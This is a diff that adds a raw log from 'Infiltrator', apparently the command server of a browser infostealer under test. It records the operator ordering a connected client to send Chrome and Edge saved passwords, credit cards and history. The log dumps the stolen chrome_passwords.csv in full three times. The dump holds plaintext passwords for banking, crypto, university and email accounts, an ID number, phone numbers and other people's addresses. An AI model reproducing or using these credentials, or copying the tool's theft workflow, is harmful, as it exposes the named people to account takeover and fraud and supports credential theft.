@@ -1,0 +1,131 @@
+-----------------------------------------------
+------ Welcome to Infiltrator Log System ------
+-----------------------------------------------
+[2024-08-02 13:18:03.421] - [INFO]: Configuración del servidor cargada correctamente.
+[2024-08-02 13:18:05.476] - [INFO]: Servidor Infiltrator iniciado en 127.0.0.1:443
+[2024-08-02 13:18:13.567] - [INFO]: Cliente 1 conectado.
+[2024-08-02 13:18:18.740] - [INFO]: Comando introducido: 1 chrome_passwords
+[2024-08-02 13:18:18.955] - [INFO]: Recibiendo archivo chrome_passwords.csv
+﻿index,url,username,password
+0,https://sid.uah.es/module.php/core/loginuserpass.php,david.fernandezsanz,sPAIN_2504200!
+1,https://www.twitch.tv/,davinccxx,David_25042001
+2,https://github.com/session,davidfernandezsanz@gmail.com,sPAIN_25042001
+3,https://login.microsoftonline.com/common/login,david.fernandezsanz@edu.uah.es,sPAIN_25042001
+4,https://discord.com/invite/gd2YHejgAw/login,davidfernandezsanz@gmail.com,david2001
+5,https://www.pandabuy.com/login,davidfernandezsanz@gmail.com,alcala2001
+6,https://www.amazon.es/ap/signin,davidfernandezsanz@gmail.com,Madrid_2504200!
+7,https://www.prozis.com/es/es/checkout/index,davidfernandezsanz@gmail.com,david2001
+8,https://www.paypal.com/signin,davidfernandezsanz@gmail.com,Madrid_2504200!
+9,https://padlet.com/auth/signup,david.fernandezsanz@edu.uah.es,Madrid_25042001
+10,https://sir2.uah.es/module.php/core/loginuserpass.php,david.fernandezsanz,sPAIN_2504200!
+11,https://www.udemy.com/join/signup-popup/,davidfernandezsanz@gmail.com,Madrid_25042001
+12,https://www.hackerrank.com/auth/signup,davidfernandezsanz@gmail.com,david2001
+13,https://steamcommunity.com/openid/loginform/,buttmeans,David_25042001
+14,https://formacion-incibe.es/login/signup.php,davinccx,Madrid_01
+15,https://accounts.binance.com/es/social-login-bind-account,davidfernandezsanz@gmail.com,Madrid_25042001
+16,https://www.paypal.com/signin,chila_618@hotmail.com,hacked_2001
+17,https://www.paypal.com/signin,comorone1@gmail.com,hacked2001
+18,https://sede.educacion.gob.es/sede/login/loginConv.jjsp,09129144F,David_2001
+19,javascript:;,asanz1966@gmail.com,David25042001
+20,https://www.overleaf.com/register,burgerkinggratis10@gmail.com,fcd_2001
+21,https://www.epicgames.com/id/login/epic,davinccx@protonmail.com,david2001
+22,https://es.overleaf.com/login,burgerkinggratis10@gmail.com,fcd_2001
+23,https://id.heroku.com/login,davidfernandezsanz@gmail.com,Madrid_2504200!
+24,https://www.amazon.com/ap/signin,davidfernandezsanz@gmail.com,Madrid_2504200!
+25,https://www.eventbrite.es/signin/,davidfernandezsanz@gmail.com,David_2001
+26,https://auth.yoigo.com/v1/oauth/authorize,638673981,david2001
+27,https://auth.yoigo.com/v1/oauth/authorize,650832479,25042001
+28,https://authenticate.riotgames.com/,usx78954,David_25042001
+29,https://w.deepl.com/,davidfernandezsanz@gmail.com,n%d23dXj!eiDsV%
+30,https://reg.rootedcon.com/account/login,davidfernandezsanz@gmail.com,David_Fernandez_25042001
+31,https://www.wegow.com/es/contrasena-olvidada,davidfernandezsanz@gmail.com,sPAIN_25042001
+32,https://identity.getpostman.com/login,davidfernandezsanz@gmail.com,david2001
+33,https://www.noip.com/es-MX/login,davidfernandezsanz@gmail.com,david2001
+34,https://procesoadmision.unir.net/matriculaunir/documentomatriculacion.aspx,davidfernandezsanz@gmail.com,Spain_25042001
+35,https://crosscutting.unir.net/login,davidfernandezsanz@gmail.com,Madrid_25042001
+36,https://www.alsa.es/checkout,davidfernandezsanz@gmail.com,sPAIN_2504200!
+[2024-08-02 13:18:19.014] - [ERROR]: Error al guardar el archivo 'chrome_passwords.csv
+﻿index,url,username,password
+0,https://sid.uah.es/module.php/core/loginuserpass.php,david.fernandezsanz,sPAIN_2504200!
+1,https://www.twitch.tv/,davinccxx,David_25042001
+2,https://github.com/session,davidfernandezsanz@gmail.com,sPAIN_25042001
+3,https://login.microsoftonline.com/common/login,david.fernandezsanz@edu.uah.es,sPAIN_25042001
+4,https://discord.com/invite/gd2YHejgAw/login,davidfernandezsanz@gmail.com,david2001
+5,https://www.pandabuy.com/login,davidfernandezsanz@gmail.com,alcala2001
+6,https://www.amazon.es/ap/signin,davidfernandezsanz@gmail.com,Madrid_2504200!
+7,https://www.prozis.com/es/es/checkout/index,davidfernandezsanz@gmail.com,david2001
+8,https://www.paypal.com/signin,davidfernandezsanz@gmail.com,Madrid_2504200!
+9,https://padlet.com/auth/signup,david.fernandezsanz@edu.uah.es,Madrid_25042001
+10,https://sir2.uah.es/module.php/core/loginuserpass.php,david.fernandezsanz,sPAIN_2504200!
+11,https://www.udemy.com/join/signup-popup/,davidfernandezsanz@gmail.com,Madrid_25042001
+12,https://www.hackerrank.com/auth/signup,davidfernandezsanz@gmail.com,david2001
+13,https://steamcommunity.com/openid/loginform/,buttmeans,David_25042001
+14,https://formacion-incibe.es/login/signup.php,davinccx,Madrid_01
+15,https://accounts.binance.com/es/social-login-bind-account,davidfernandezsanz@gmail.com,Madrid_25042001
+16,https://www.paypal.com/signin,chila_618@hotmail.com,hacked_2001
+17,https://www.paypal.com/signin,comorone1@gmail.com,hacked2001
+18,https://sede.educacion.gob.es/sede/login/loginConv.jjsp,09129144F,David_2001
+19,javascript:;,asanz1966@gmail.com,David25042001
+20,https://www.overleaf.com/register,burgerkinggratis10@gmail.com,fcd_2001
+21,https://www.epicgames.com/id/login/epic,davinccx@protonmail.com,david2001
+22,https://es.overleaf.com/login,burgerkinggratis10@gmail.com,fcd_2001
+23,https://id.heroku.com/login,davidfernandezsanz@gmail.com,Madrid_2504200!
+24,https://www.amazon.com/ap/signin,davidfernandezsanz@gmail.com,Madrid_2504200!
+25,https://www.eventbrite.es/signin/,davidfernandezsanz@gmail.com,David_2001
+26,https://auth.yoigo.com/v1/oauth/authorize,638673981,david2001
+27,https://auth.yoigo.com/v1/oauth/authorize,650832479,25042001
+28,https://authenticate.riotgames.com/,usx78954,David_25042001
+29,https://w.deepl.com/,davidfernandezsanz@gmail.com,n%d23dXj!eiDsV%
+30,https://reg.rootedcon.com/account/login,davidfernandezsanz@gmail.com,David_Fernandez_25042001
+31,https://www.wegow.com/es/contrasena-olvidada,davidfernandezsanz@gmail.com,sPAIN_25042001
+32,https://identity.getpostman.com/login,davidfernandezsanz@gmail.com,david2001
+33,https://www.noip.com/es-MX/login,davidfernandezsanz@gmail.com,david2001
+34,https://procesoadmision.unir.net/matriculaunir/documentomatriculacion.aspx,davidfernandezsanz@gmail.com,Spain_25042001
+35,https://crosscutting.unir.net/login,davidfernandezsanz@gmail.com,Madrid_25042001
+36,https://www.alsa.es/checkout,davidfernandezsanz@gmail.com,sPAIN_2504200!': El nombre de archivo, el nombre de directorio o la sintaxis de la etiqueta del volumen no son correctos. : 'C:\Users\David\Desktop\Infiltrator\Infiltrator-Project\ConsoleApp1\bin\Debug\net8.0\chrome_passwords.csv
+﻿index,url,username,password
+0,https:\sid.uah.es\module.php\core\loginuserpass.php,david.fernandezsanz,sPAIN_2504200!
+1,https:\www.twitch.tv\,davinccxx,David_25042001
+2,https:\github.com\session,davidfernandezsanz@gmail.com,sPAIN_25042001
+3,https:\login.microsoftonline.com\common\login,david.fernandezsanz@edu.uah.es,sPAIN_25042001
+4,https:\discord.com\invite\gd2YHejgAw\login,davidfernandezsanz@gmail.com,david2001
+5,https:\www.pandabuy.com\login,davidfernandezsanz@gmail.com,alcala2001
+6,https:\www.amazon.es\ap\signin,davidfernandezsanz@gmail.com,Madrid_2504200!
+7,https:\www.prozis.com\es\es\checkout\index,davidfernandezsanz@gmail.com,david2001
+8,https:\www.paypal.com\signin,davidfernandezsanz@gmail.com,Madrid_2504200!
+9,https:\padlet.com\auth\signup,david.fernandezsanz@edu.uah.es,Madrid_25042001
+10,https:\sir2.uah.es\module.php\core\loginuserpass.php,david.fernandezsanz,sPAIN_2504200!
+11,https:\www.udemy.com\join\signup-popup\,davidfernandezsanz@gmail.com,Madrid_25042001
+12,https:\www.hackerrank.com\auth\signup,davidfernandezsanz@gmail.com,david2001
+13,https:\steamcommunity.com\openid\loginform\,buttmeans,David_25042001
+14,https:\formacion-incibe.es\login\signup.php,davinccx,Madrid_01
+15,https:\accounts.binance.com\es\social-login-bind-account,davidfernandezsanz@gmail.com,Madrid_25042001
+16,https:\www.paypal.com\signin,chila_618@hotmail.com,hacked_2001
+17,https:\www.paypal.com\signin,comorone1@gmail.com,hacked2001
+18,https:\sede.educacion.gob.es\sede\login\loginConv.jjsp,09129144F,David_2001
+19,javascript:;,asanz1966@gmail.com,David25042001
+20,https:\www.overleaf.com\register,burgerkinggratis10@gmail.com,fcd_2001
+21,https:\www.epicgames.com\id\login\epic,davinccx@protonmail.com,david2001
+22,https:\es.overleaf.com\login,burgerkinggratis10@gmail.com,fcd_2001
+23,https:\id.heroku.com\login,davidfernandezsanz@gmail.com,Madrid_2504200!
+24,https:\www.amazon.com\ap\signin,davidfernandezsanz@gmail.com,Madrid_2504200!
+25,https:\www.eventbrite.es\signin\,davidfernandezsanz@gmail.com,David_2001
+26,https:\auth.yoigo.com\v1\oauth\authorize,638673981,david2001
+27,https:\auth.yoigo.com\v1\oauth\authorize,650832479,25042001
+28,https:\authenticate.riotgames.com\,usx78954,David_25042001
+29,https:\w.deepl.com\,davidfernandezsanz@gmail.com,n%d23dXj!eiDsV%
+30,https:\reg.rootedcon.com\account\login,davidfernandezsanz@gmail.com,David_Fernandez_25042001
+31,https:\www.wegow.com\es\contrasena-olvidada,davidfernandezsanz@gmail.com,sPAIN_25042001
+32,https:\identity.getpostman.com\login,davidfernandezsanz@gmail.com,david2001
+33,https:\www.noip.com\es-MX\login,davidfernandezsanz@gmail.com,david2001
+34,https:\procesoadmision.unir.net\matriculaunir\documentomatriculacion.aspx,davidfernandezsanz@gmail.com,Spain_25042001
+35,https:\crosscutting.unir.net\login,davidfernandezsanz@gmail.com,Madrid_25042001
+36,https:\www.alsa.es\checkout,davidfernandezsanz@gmail.com,sPAIN_2504200!'
+[2024-08-02 13:18:37.305] - [INFO]: Comando introducido: 1 edge_history
+[2024-08-02 13:18:46.401] - [INFO]: Comando introducido: 1 edge_passwords
+[2024-08-02 13:18:46.580] - [INFO]: Recibiendo archivo edge_passwords.csv
+[2024-08-02 13:18:46.611] - [INFO]: Archivo 'edge_passwords.csv' recibido y guardado correctamente.
+[2024-08-02 13:18:51.659] - [INFO]: Comando introducido: 1 edge_ccs
+[2024-08-02 13:18:51.731] - [INFO]: Recibiendo archivo edge_ccs.csv
+[2024-08-02 13:18:51.760] - [INFO]: Archivo 'edge_ccs.csv' recibido y guardado correctamente.
+[2024-08-02 13:19:02.449] - [INFO]: Comando introducido: 1 edge_history
